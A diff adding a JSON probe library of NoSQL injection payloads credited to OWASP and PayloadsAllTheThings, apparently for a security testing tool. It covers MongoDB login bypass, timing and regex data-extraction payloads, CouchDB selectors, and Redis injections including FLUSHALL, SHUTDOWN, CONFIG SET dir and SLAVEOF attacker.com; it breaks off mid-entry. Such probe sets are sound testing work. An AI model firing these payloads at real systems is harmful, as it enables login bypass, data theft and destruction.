@@ -1,0 +1,1757 @@
+[
+  {
+    "id": "nosql-injection-owasp-0001",
+    "name": "Authentication Bypass - JSON Format",
+    "template": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+    "description": "Authentication Bypass - JSON Format probe from OWASP. Tests application handling of: {\"username\": {\"$ne\": null}, \"p...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0002",
+    "name": "Authentication Bypass - JSON Format #2",
+    "template": "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
+    "description": "Authentication Bypass - JSON Format probe from OWASP. Tests application handling of: {\"username\": {\"$ne\": \"\"}, \"pas...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0003",
+    "name": "Authentication Bypass - JSON Format #3",
+    "template": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+    "description": "Authentication Bypass - JSON Format probe from OWASP. Tests application handling of: {\"username\": {\"$gt\": \"\"}, \"pas...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0004",
+    "name": "Authentication Bypass - JSON Format #4",
+    "template": "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}",
+    "description": "Authentication Bypass - JSON Format probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \".*\"},...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0005",
+    "name": "Authentication Bypass - JSON Format #5",
+    "template": "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}",
+    "description": "Authentication Bypass - JSON Format probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0006",
+    "name": "Authentication Bypass - JSON Format #6",
+    "template": "{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}",
+    "description": "Authentication Bypass - JSON Format probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0007",
+    "name": "Authentication Bypass - JSON Format #7",
+    "template": "{\"username\": {\"$in\": [\"admin\", \"administrator\", \"root\"]}, \"password\": {\"$ne\": \"\"}}",
+    "description": "Authentication Bypass - JSON Format probe from OWASP. Tests application handling of: {\"username\": {\"$in\": [\"admin\",...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0008",
+    "name": "Authentication Bypass - URL Encoded",
+    "template": "username[$ne]=null&password[$ne]=null",
+    "description": "Authentication Bypass - URL Encoded probe from OWASP. Tests application handling of: username[$ne]=null&password[$n...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0009",
+    "name": "Authentication Bypass - URL Encoded #2",
+    "template": "username[$ne]=&password[$ne]=",
+    "description": "Authentication Bypass - URL Encoded probe from OWASP. Tests application handling of: username[$ne]=&password[$ne]=",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0010",
+    "name": "Authentication Bypass - URL Encoded #3",
+    "template": "username[$gt]=&password[$gt]=",
+    "description": "Authentication Bypass - URL Encoded probe from OWASP. Tests application handling of: username[$gt]=&password[$gt]=",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0011",
+    "name": "Authentication Bypass - URL Encoded #4",
+    "template": "username[$regex]=.*&password[$regex]=.*",
+    "description": "Authentication Bypass - URL Encoded probe from OWASP. Tests application handling of: username[$regex]=.*&password[$...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0012",
+    "name": "Authentication Bypass - URL Encoded #5",
+    "template": "username=admin&password[$ne]=",
+    "description": "Authentication Bypass - URL Encoded probe from OWASP. Tests application handling of: username=admin&password[$ne]=",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0013",
+    "name": "Authentication Bypass - URL Encoded #6",
+    "template": "username=admin&password[$gt]=",
+    "description": "Authentication Bypass - URL Encoded probe from OWASP. Tests application handling of: username=admin&password[$gt]=",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0014",
+    "name": "Authentication Bypass - URL Encoded #7",
+    "template": "username[$nin][]=&password[$ne]=",
+    "description": "Authentication Bypass - URL Encoded probe from OWASP. Tests application handling of: username[$nin][]=&password[$ne...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0015",
+    "name": "Authentication Bypass - URL Encoded #8",
+    "template": "username[$exists]=true&password[$exists]=true",
+    "description": "Authentication Bypass - URL Encoded probe from OWASP. Tests application handling of: username[$exists]=true&passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0016",
+    "name": "MongoDB Operators Injection",
+    "template": "{\"$where\": \"sleep(5000)\"}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"$where\": \"sleep(5000)\"}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0017",
+    "name": "MongoDB Operators Injection #2",
+    "template": "{\"$where\": \"this.password == 'admin'\"}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"$where\": \"this.password == '...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0018",
+    "name": "MongoDB Operators Injection #3",
+    "template": "{\"username\": {\"$regex\": \"^admin\"}}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^admi...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0019",
+    "name": "MongoDB Operators Injection #4",
+    "template": "{\"username\": {\"$regex\": \"admin.*\"}}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"admin...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0020",
+    "name": "MongoDB Operators Injection #5",
+    "template": "{\"email\": {\"$regex\": \".*@domain\\\\.com$\"}}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"email\": {\"$regex\": \".*@domai...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0021",
+    "name": "MongoDB Operators Injection #6",
+    "template": "{\"role\": {\"$in\": [\"admin\", \"superuser\"]}}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"role\": {\"$in\": [\"admin\", \"su...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0022",
+    "name": "MongoDB Operators Injection #7",
+    "template": "{\"age\": {\"$gt\": 0}}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"age\": {\"$gt\": 0}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0023",
+    "name": "MongoDB Operators Injection #8",
+    "template": "{\"price\": {\"$lt\": 9999}}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"price\": {\"$lt\": 9999}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0024",
+    "name": "MongoDB Operators Injection #9",
+    "template": "{\"status\": {\"$ne\": \"inactive\"}}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"status\": {\"$ne\": \"inactive\"}...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0025",
+    "name": "MongoDB Operators Injection #10",
+    "template": "{\"verified\": {\"$eq\": true}}",
+    "description": "MongoDB Operators Injection probe from OWASP. Tests application handling of: {\"verified\": {\"$eq\": true}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0026",
+    "name": "Time-Based NoSQL Injection (MongoDB)",
+    "template": "{\"$where\": \"sleep(5000) || true\"}",
+    "description": "Time-Based NoSQL Injection (MongoDB) probe from OWASP. Tests application handling of: {\"$where\": \"sleep(5000) || tru...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0027",
+    "name": "Time-Based NoSQL Injection (MongoDB) #2",
+    "template": "{\"username\": {\"$regex\": \"^a\"}, \"$where\": \"sleep(5000)\"}",
+    "description": "Time-Based NoSQL Injection (MongoDB) probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^a\"},...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0028",
+    "name": "Time-Based NoSQL Injection (MongoDB) #3",
+    "template": "';sleep(5000);'",
+    "description": "Time-Based NoSQL Injection (MongoDB) probe from OWASP. Tests application handling of: ';sleep(5000);'",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadsAllTheThings",
+    "sourceFile": "nosql-injection-payloads.txt, NoSQL.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0029",
+    "name": "Time-Based NoSQL Injection (MongoDB) #4",
+    "template": "';return true;var x='",
+    "description": "Time-Based NoSQL Injection (MongoDB) probe from OWASP. Tests application handling of: ';return true;var x='",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0030",
+    "name": "Time-Based NoSQL Injection (MongoDB) #5",
+    "template": "{\"username\": \"admin\", \"$where\": \"sleep(5000)\"}",
+    "description": "Time-Based NoSQL Injection (MongoDB) probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"$where\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0031",
+    "name": "Data Extraction - MongoDB",
+    "template": "{\"username\": {\"$regex\": \"^a\"}}",
+    "description": "Data Extraction - MongoDB probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^a\"}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0032",
+    "name": "Data Extraction - MongoDB #2",
+    "template": "{\"username\": {\"$regex\": \"^ad\"}}",
+    "description": "Data Extraction - MongoDB probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^ad\"}...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0033",
+    "name": "Data Extraction - MongoDB #3",
+    "template": "{\"username\": {\"$regex\": \"^adm\"}}",
+    "description": "Data Extraction - MongoDB probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^adm\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0034",
+    "name": "Data Extraction - MongoDB #4",
+    "template": "{\"username\": {\"$regex\": \"^admi\"}}",
+    "description": "Data Extraction - MongoDB probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^admi...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0035",
+    "name": "Data Extraction - MongoDB #5",
+    "template": "{\"password\": {\"$regex\": \"^[a-z]\"}}",
+    "description": "Data Extraction - MongoDB probe from OWASP. Tests application handling of: {\"password\": {\"$regex\": \"^[a-z...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0036",
+    "name": "Data Extraction - MongoDB #6",
+    "template": "{\"apiKey\": {\"$regex\": \"^.*\"}}",
+    "description": "Data Extraction - MongoDB probe from OWASP. Tests application handling of: {\"apiKey\": {\"$regex\": \"^.*\"}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0037",
+    "name": "Boolean-Based MongoDB Injection",
+    "template": "{\"username\": \"admin\", \"password\": {\"$ne\": \"wrong\"}}",
+    "description": "Boolean-Based MongoDB Injection probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0038",
+    "name": "Boolean-Based MongoDB Injection #2",
+    "template": "{\"$or\": [{\"username\": \"admin\"}, {\"email\": \"admin@test.com\"}]}",
+    "description": "Boolean-Based MongoDB Injection probe from OWASP. Tests application handling of: {\"$or\": [{\"username\": \"admin\"}...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0039",
+    "name": "Boolean-Based MongoDB Injection #3",
+    "template": "{\"$and\": [{\"username\": {\"$exists\": true}}, {\"password\": {\"$exists\": true}}]}",
+    "description": "Boolean-Based MongoDB Injection probe from OWASP. Tests application handling of: {\"$and\": [{\"username\": {\"$exis...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0040",
+    "name": "Boolean-Based MongoDB Injection #4",
+    "template": "{\"$nor\": [{\"banned\": true}, {\"deleted\": true}]}",
+    "description": "Boolean-Based MongoDB Injection probe from OWASP. Tests application handling of: {\"$nor\": [{\"banned\": true}, {\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0041",
+    "name": "MongoDB Command Injection",
+    "template": "{\"username\": \"admin\", \"$comment\": \"test\"}",
+    "description": "MongoDB Command Injection probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"$commen...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0042",
+    "name": "MongoDB Command Injection #2",
+    "template": "{\"username\": \"admin\", \"$hint\": \"username_1\"}",
+    "description": "MongoDB Command Injection probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"$hint\":...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0043",
+    "name": "MongoDB Command Injection #3",
+    "template": "{\"$orderby\": {\"username\": 1}}",
+    "description": "MongoDB Command Injection probe from OWASP. Tests application handling of: {\"$orderby\": {\"username\": 1}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0044",
+    "name": "MongoDB Command Injection #4",
+    "template": "{\"username\": {\"$type\": 2}}",
+    "description": "MongoDB Command Injection probe from OWASP. Tests application handling of: {\"username\": {\"$type\": 2}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0045",
+    "name": "MongoDB Command Injection #5",
+    "template": "{\"username\": {\"$size\": 5}}",
+    "description": "MongoDB Command Injection probe from OWASP. Tests application handling of: {\"username\": {\"$size\": 5}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0046",
+    "name": "MongoDB Operator Abuse",
+    "template": "{\"username\": {\"$all\": [\"admin\"]}}",
+    "description": "MongoDB Operator Abuse probe from OWASP. Tests application handling of: {\"username\": {\"$all\": [\"admin\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0047",
+    "name": "MongoDB Operator Abuse #2",
+    "template": "{\"roles\": {\"$elemMatch\": {\"role\": \"admin\"}}}",
+    "description": "MongoDB Operator Abuse probe from OWASP. Tests application handling of: {\"roles\": {\"$elemMatch\": {\"rol...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0048",
+    "name": "MongoDB Operator Abuse #3",
+    "template": "{\"metadata\": {\"$exists\": false}}",
+    "description": "MongoDB Operator Abuse probe from OWASP. Tests application handling of: {\"metadata\": {\"$exists\": false...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0049",
+    "name": "MongoDB Operator Abuse #4",
+    "template": "{\"settings\": {\"$nin\": [\"disabled\"]}}",
+    "description": "MongoDB Operator Abuse probe from OWASP. Tests application handling of: {\"settings\": {\"$nin\": [\"disabl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0050",
+    "name": "Advanced MongoDB Injection (2023-2025)",
+    "template": "{\"username\": {\"$expr\": {\"$eq\": [\"$username\", \"admin\"]}}}",
+    "description": "Advanced MongoDB Injection (2023-2025) probe from OWASP. Tests application handling of: {\"username\": {\"$expr\": {\"$eq\":...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0051",
+    "name": "Advanced MongoDB Injection (2023-2025) #2",
+    "template": "{\"$expr\": {\"$gt\": [{\"$strLenCP\": \"$password\"}, 0]}}",
+    "description": "Advanced MongoDB Injection (2023-2025) probe from OWASP. Tests application handling of: {\"$expr\": {\"$gt\": [{\"$strLenCP...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0052",
+    "name": "Advanced MongoDB Injection (2023-2025) #3",
+    "template": "{\"username\": {\"$jsonSchema\": {}}}",
+    "description": "Advanced MongoDB Injection (2023-2025) probe from OWASP. Tests application handling of: {\"username\": {\"$jsonSchema\": {...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0053",
+    "name": "Advanced MongoDB Injection (2023-2025) #4",
+    "template": "{\"username\": \"admin'; return true; var a='\"}",
+    "description": "Advanced MongoDB Injection (2023-2025) probe from OWASP. Tests application handling of: {\"username\": \"admin'; return t...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0054",
+    "name": "Advanced MongoDB Injection (2023-2025) #5",
+    "template": "{\"username\": \"admin\\\"; return true; var a=\\\"\"}",
+    "description": "Advanced MongoDB Injection (2023-2025) probe from OWASP. Tests application handling of: {\"username\": \"admin\\\"; return ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0055",
+    "name": "CouchDB View Manipulation",
+    "template": "startkey=\"admin\"&endkey=\"admin\\ufff0\"",
+    "description": "CouchDB View Manipulation probe from OWASP. Tests application handling of: startkey=\"admin\"&endkey=\"admin...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0056",
+    "name": "CouchDB View Manipulation #2",
+    "template": "startkey=[\"admin\"]&endkey=[\"admin\", {}]",
+    "description": "CouchDB View Manipulation probe from OWASP. Tests application handling of: startkey=[\"admin\"]&endkey=[\"ad...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0057",
+    "name": "CouchDB View Manipulation #3",
+    "template": "key=\"admin\"",
+    "description": "CouchDB View Manipulation probe from OWASP. Tests application handling of: key=\"admin\"",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0058",
+    "name": "CouchDB View Manipulation #4",
+    "template": "keys=[\"admin\",\"root\",\"administrator\"]",
+    "description": "CouchDB View Manipulation probe from OWASP. Tests application handling of: keys=[\"admin\",\"root\",\"administ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0059",
+    "name": "CouchDB Query Injection",
+    "template": "{\"selector\": {\"username\": {\"$eq\": \"admin\"}}}",
+    "description": "CouchDB Query Injection probe from OWASP. Tests application handling of: {\"selector\": {\"username\": {\"$e...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0060",
+    "name": "CouchDB Query Injection #2",
+    "template": "{\"selector\": {\"$or\": [{\"username\": \"admin\"}, {\"role\": \"admin\"}]}}",
+    "description": "CouchDB Query Injection probe from OWASP. Tests application handling of: {\"selector\": {\"$or\": [{\"userna...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0061",
+    "name": "CouchDB Query Injection #3",
+    "template": "{\"selector\": {\"password\": {\"$gt\": null}}}",
+    "description": "CouchDB Query Injection probe from OWASP. Tests application handling of: {\"selector\": {\"password\": {\"$g...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0062",
+    "name": "CouchDB Query Injection #4",
+    "template": "{\"selector\": {\"_id\": {\"$gte\": null}}}",
+    "description": "CouchDB Query Injection probe from OWASP. Tests application handling of: {\"selector\": {\"_id\": {\"$gte\": ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0063",
+    "name": "CouchDB Mango Query Injection",
+    "template": "{\"selector\": {\"$and\": [{\"username\": {\"$exists\": true}}, {\"password\": {\"$exists\": true}}]}}",
+    "description": "CouchDB Mango Query Injection probe from OWASP. Tests application handling of: {\"selector\": {\"$and\": [{\"usern...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0064",
+    "name": "CouchDB Mango Query Injection #2",
+    "template": "{\"selector\": {\"username\": {\"$regex\": \"(?i)admin\"}}}",
+    "description": "CouchDB Mango Query Injection probe from OWASP. Tests application handling of: {\"selector\": {\"username\": {\"$r...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0065",
+    "name": "CouchDB Mango Query Injection #3",
+    "template": "{\"selector\": {\"email\": {\"$regex\": \".*@.*\"}}}",
+    "description": "CouchDB Mango Query Injection probe from OWASP. Tests application handling of: {\"selector\": {\"email\": {\"$rege...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0066",
+    "name": "Redis Command Injection",
+    "template": "\\n\\r\\nSET key value\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nSET key value\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0067",
+    "name": "Redis Command Injection #2",
+    "template": "\\n\\r\\nFLUSHALL\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nFLUSHALL\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0068",
+    "name": "Redis Command Injection #3",
+    "template": "\\n\\r\\nGET password\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nGET password\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0069",
+    "name": "Redis Command Injection #4",
+    "template": "\\n\\r\\nKEYS *\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nKEYS *\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0070",
+    "name": "Redis Command Injection #5",
+    "template": "\\n\\r\\nCONFIG GET *\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nCONFIG GET *\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0071",
+    "name": "Redis Command Injection #6",
+    "template": "\\n\\r\\nCONFIG SET dir /var/www/html\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nCONFIG SET dir /var/www/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0072",
+    "name": "Redis Command Injection #7",
+    "template": "\\n\\r\\nSAVE\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nSAVE\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0073",
+    "name": "Redis Command Injection #8",
+    "template": "\\n\\r\\nSHUTDOWN\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nSHUTDOWN\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0074",
+    "name": "Redis Command Injection #9",
+    "template": "\\n\\r\\nSLAVEOF attacker.com 6379\\r\\n",
+    "description": "Redis Command Injection probe from OWASP. Tests application handling of: \\n\\r\\nSLAVEOF attacker.com 637...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0075",
+    "name": "Redis Protocol Injection",
+    "template": "*1\\r\\n$8\\r\\nFLUSHALL\\r\\n",
+    "description": "Redis Protocol Injection probe from OWASP. Tests application handling of: *1\\r\\n$8\\r\\nFLUSHALL\\r\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0076",
+    "name": "Redis Protocol Injection #2",
+    "template": "*1\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\n",
+    "description": "Redis Protocol Injection probe from OWASP. Tests application handling of: *1\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0077",
+    "name": "Redis Protocol Injection #3",
+    "template": "*2\\r\\n$3\\r\\nGET\\r\\n$3\\r\\nkey\\r\\n",
+    "description": "Redis Protocol Injection probe from OWASP. Tests application handling of: *2\\r\\n$3\\r\\nGET\\r\\n$3\\r\\nkey\\r...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0078",
+    "name": "Redis Protocol Injection #4",
+    "template": "*3\\r\\n$3\\r\\nSET\\r\\n$4\\r\\ntest\\r\\n$5\\r\\nvalue\\r\\n",
